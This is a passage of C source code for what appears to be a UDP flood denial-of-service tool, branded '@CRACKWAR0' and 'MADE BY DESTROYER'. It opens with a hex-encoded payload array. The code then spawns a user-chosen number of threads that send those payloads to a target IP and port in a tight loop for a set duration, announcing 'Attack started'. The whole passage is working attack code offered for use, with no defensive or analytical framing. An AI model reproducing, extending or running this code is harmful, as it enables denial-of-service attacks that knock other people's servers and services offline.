x4e\x92\x58\x6c\x89\x42\xfc\xe9\x78\x2c\x23\x17\x8b\x50\x56\xdf\x51\xe3\x00\x0b\x60\xe3\xad\xf9\x3d\x4c\xc8\xef\xe9\x78\x45\x95\x9d\xae\x1c\xf1\x12\x9f\x0b\x39\x84\xd3\x4e\xcd\x97\xec\xbb\x23\xc6\x73\xa2\xcb\x11\xfa\x77\x14\xd6\x85\xd0\x32\xe6\xf8\xdc\xb3\x5c\x9d\x70\x7b\x41\x36\x06\x5e\x74\x77\x88\x66\xe8\x5d\x6c\x82\x95\x9c\xd3\x6e\x00\x2a\x62\xf6\x36\x80\x93\xf1\x88\xd5\x18\x39\x37\x8f\x00\x11\x2b\x24\xe6\x56\x19\x73\xc9\xda\x68\xef\xfa\x19\xa3\xe1\xec\x67\x52\x4f\x34\xd7\xb4\x74\x49\x00\xff\x81\x81\xd0\xc1\x8e\xa4\xb8\x45\xbe\xb9\x94\xff\xeb\x9f\x82\x33\x73\x53\xb4\xd2\x57\xda\xaf\xe1\xb5\xd5\xc2\x50\xc0\xf6\x37\x17\xcd\x30\x18\xa7\x7b\xef\x2e\xe1\xb5\x3e\xea\x2a\x6c\x51\x6e\x40\x85\x7e\x31\x4e\x89\x17\x8b\x13\xa3\xdb\x92\xa2\x36\x3e\x07\x2c\x15\x24\x9d\x88\x0d\x1d\x1d\x4c\xe9\xa1\xf0\xb5\xbd\x47\xd8\xf3\xfc\xa9\x03\x4e\x16\xb9\x34\xf0\x99\x89\xff\xb2\x6d\xda\x81\xdc\x9d\x0e\xe3\xd3\xe8\x1f\xb0\x91\x7c\x32\x8d\xb1\x44\x21\xb9\x97\x4c\x5f\xaf\xc2\xfe\xa2\x68\xed\x9b\xde\x2d\x0b\xd0\xeb\x04\x22\x0b\xe7\x2c\xc2\x43\x2f\xbe\x86\x1f\xda\x51\x3b\xfd\x00\x4a\xcc\x2e\x10\x10\xa0\xe1\x3f\x09\x79\x60\x41\x5b\x45\x7f\x9a\x40\x33\x7a\x98\x06\xeb\x53\xc3\xd7\x92\x41\xc9\xf2\xce\x55\x49\xf2\x4b\x0e\x23\x93\xf1\x71\x1b\xce\x40\x7a\x39\xc0\x92\x2c\xb2\xfc\x96\xb1\x72\x50\x16\x12\xaa\x1c\xfe\x1d\xc3\xd8\x36\x12\xc6\x8d\xde\xcf\xc1\x80\xca\x23\x23\x0f\xc5\x74\x8f\xd0\x33\x23\x0d\xe7\x7a\xef\x03\x6f\xa9\x03\xa6\xfb\x5b\xd5\x47\xe1\x43\xa1\xb5\x4b\x7f\xbb\x61\x6b\xaa\x9a\x90\x4c\xf8\x37\x01\x0b\x57\x93\x80\xc8\x50\x5e\xed\xd1\xb6\x30\x7c\x93\x35\x84\x20\x18\x5e\x5c\x04\xdc\x38\x76\x78\x8e\xf2\x9a\xcd\xcf\x81\x8f\xd6\x29\x77\xda\xc4\xcd\x5e\x9b\x4a\xca\xe6\xb5\x84\x57\xc8\xc5\xa1\x4e\xbf\x0f\xa0\x3f\xa0\xde\x76\xc6\x4a\xb5\x3f\xf3\x6f\x97\x95\xef\xa5\x6c\x46\xed\xb5\x50\x8f\xfe\x21\xe1\x25\x75\x71\xa1\x64\xd8\xb5\xe9\x86\x17\xb7\x05\xdc\x93\xd7\x6a\xb2\xb4\x74\xb0\xb8\xf1\xd1\x51\x9c\x77\x29\xfa\xb7\x5e\x9a\x3c\x19\x5e\xa9\xda\xcd\x61\xfc\xf7\xf2\x5d\xbb\x0b\xe5\x86\x10\x37\x09\x1e\xc5\xf4\xfb\xd2\x71\x43\x7b\xc7\x9d\x9f\x4d\xce\x6f\xe3\x25\xb4\xa3\x01\xd9\x81\x65\xb8\x13\x56\xc4\xf2\xf7\xab\x64\xae\x0e\x3d\x71\x70\x55\xd7\x38\x45\xeb\x64\xa3\x64\x8b\x58\xd3\xca\x72\xba\x54\x61\x60\x09\x24\x3d\xe1\x78\x9a\x48\x1d\x6c\x53\xdd\xdc\xbe\xaf\x12\x8f\x02\x62\xd6\x06\xe2\x35\x01\xc4\x00\x57\xd8\x2e\x85\x68\x71\x1f\x53\x61\xd9\x83\x95\x1f\xf6\xe5\x31\x0f\x85\xd6\x32\x5b\xa0\xef\x3a\x6b\x6f\xc4\x27\x56\xe0\x68\x69\x51\x25\x33\xbc\xa1\x1b\x87\xa7\x3b\xbe\x54\xb1\x2e\x8f\xfe\x26\xc5\x43\x89\x3c\xa0\x77\xe2\x35\x60\xcc\x67\x56\xf7\x27\x01\x45\x0a\x2e\xaf\x4e\xeb\xec\xfa\xb0\x1a\x87\xe3\x8e\x96\x7f\x97\xec\x27\xf9\x50\x76\x35\x66\x2c\xd6\xdc\xbb\xa9\xda\x97\x68\x30\x5e\x6b\x6f\xf8\xff\x87\xf1\xd5\x67\x5b\xd5\x8a\xb5\xfc\xd4\x00\xce\xab\x0f\xe6\x4d\x70\x5d\xb1\x68\x8f\xfa\x5d\x49\x76\x41\xf2\xbe\xe2\xac\xb6\xf6\x0a\xa9\x27\x0a\xcd\x77\x5a\xa0\xbb\xba\x08\x6e\x34\x57\xbe\xdf\xea\x46\x5e\xcb\xb3\x61\x74\x69\xe4\x5a\xc8\xd2\x32\xb0\xae\xe8\xce\xbb\x65\x2c\xcc\xc2\xb3\xd4\xac\xd8\x1e\x85\x20\xe4\x31\x93\xa3\x96\x21\x22\xcb\x07\x77\x4c\xa1\x31\x77\xaa\xbc\xae\x41\x76\x47\x20\x57\xaa\x3f\x52\x02\x0a\x03\xbc\x8b\x15\xbd\xc5\xd8\x75\xd8\x44\x46\x3b\xce\x1f\x45\x7e\xe5\x2e\xa0\x75\x22\x2c\x48\x13\x22\xa2\x3e\xc0\xe5\x6b\x67\x16\x6b\x82\xff\x9d\x1c\xb4\xfd\x62\xc6\x83\x0a\x3a\x8d\xee\x9c\xf8\x00\x61\xe0\x05\xa2\x45\xdc\xe2\x7c\xc1\x66\x77\xa3\x96\x4a\xd9\xd0\xbd\xce\x95\x7d\x13\x4d\x5b\x7e\xe9\xa7\xc2\xa5\xb7\x31\xca\xeb\x0a\x90\x4d\xd0\x62\x0f\xdf\xd4\x6e\x0b\x3c\x1c\x0c\xe3\x9a\xe6\x93\x30\xde\x21\xf2\x44\x36\x95\x42\x4e\xaa\x72\x98\x7c\xf4\x48\xdf\xd8\xdd\x2a\x27\x84\x94\x6e\xfd\x84\x92\x56\x3b\x35\x1d\x32\xb0\x4b\x83\x94\xb0\xf7\x6d\x08\x6d\x41\x9a\xd7\x7f\xc1\xf3\x17\x00\x9c\xa9\xb5\x4b\xe1\xab\x45\x40\x95\x20\x78\x71\x43\xb4\x9d\xdd\xc8\x7b\xdd\x90\x34\xdf\x8f\xa2\x45\x07\x7d\x68\xf9\x0f\xdd\xab\x55\x3b\x7b\x39\x65\xb6\x07\x98\x95\xdf\x50\x44\x7f\xd1\x7e\x1a\x64\x0b\x69\x7f\x51\xa2\x98\xe9\xd9\xce\x74\xe8\xc8\xa1\x8c\x94\x81\x8e\x59\x97\x7e\x72\xda\x12\x22\x84\xee\xbb\xa3\x47\x1d\xec\xef\xc1\x81\x9a\x88\x19\x78\x35\xf1\xd0\xdf\x95\x89\x84\x2e\x1c\xc4\x2c\x1b\xc0\x5b\xfb\xab\x9c\x93\x45\xd7\xbe\xda\x55\x2a\xdf\xca\x75\x90\x6e\x6f\xfa\xe9\xbb\x97\xe7\xb4\x0c\x0a\xcb\x19\x12\xec\x8f\x8d\x5d\x3b\x7d\x87\xdd\x10\x40\xb2\xb9\x59\x8c\x5b\x2e\x33\x0a\x20\x7d\x89\x9b\x2b\x38\x4a\xa3\xc0\xcc\x73\xda\x38\xc4\x5c\x52\xfb\x2b\xf4\x52\x1a\x4e\x19\x22\x14\x79\x0f\xe9\xfe\xf6\x79\x36\x10\x5c\x58\x90\x1b\xb2\x02\x04\x34\xbb\xe5\x3e\x8c\x3e\x11\xf5\xaa\xdb\x62\x80\x8a\xdf\x3c\x5e\xa5\xd7\xf5\xc3\x9f\xda\x7b\xe4\x9f\x34\x10\x04\x75\x7b\x06\xd6\x62\x09\x26\x86\x68\x50\x7b\x9e\x0a\x98\xab\x67\xa0\xb5\x0a\x25\x3d\x86\x75\x89\xdb\x95\x01\xae\xad\xe5\x29\xcc\xc5\x4b"
    };



    if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        perror("Socket creation failed");
        pthread_exit(NULL);
    }

    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(data->port);
    server_addr.sin_addr.s_addr = inet_addr(data->ip);

    endtime = time(NULL) + data->time;

    while (time(NULL) <= endtime) {
        for (int i = 0; i < sizeof(payloads) / sizeof(payloads[0]); i++) {
            if (sendto(sock, payloads[i], strlen(payloads[i]), 0,
                       (const struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
                perror("Send failed");
                close(sock);
                pthread_exit(NULL);
            }
        }
    }

    close(sock);
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    if (argc != 5) {
        usage();
    }

    char *ip = argv[1];
    int port = atoi(argv[2]);
    int time = atoi(argv[3]);
    int threads = atoi(argv[4]);
    pthread_t *thread_ids = malloc(threads * sizeof(pthread_t));
    struct thread_data data = {ip, port, time};

    printf("Attack started on %s:%d for %d seconds with %d threads\n", ip, port, time, threads);

    for (int i = 0; i < threads; i++) {
        if (pthread_create(&thread_ids[i], NULL, attack, (void *)&data) != 0) {
            perror("Thread creation failed");
            free(thread_ids);
            exit(1);
        }
        printf("Launched thread with ID: @CRACKWAR0 %lu\n", thread_ids[i]);
    }

    for (int i = 0; i < threads; i++) {
        pthread_join(thread_ids[i], NULL);
    }

    free(thread_ids);
    printf("JOIN @CRACKWAR0 MADE BY DESTROYER\n");
    return 0;
}
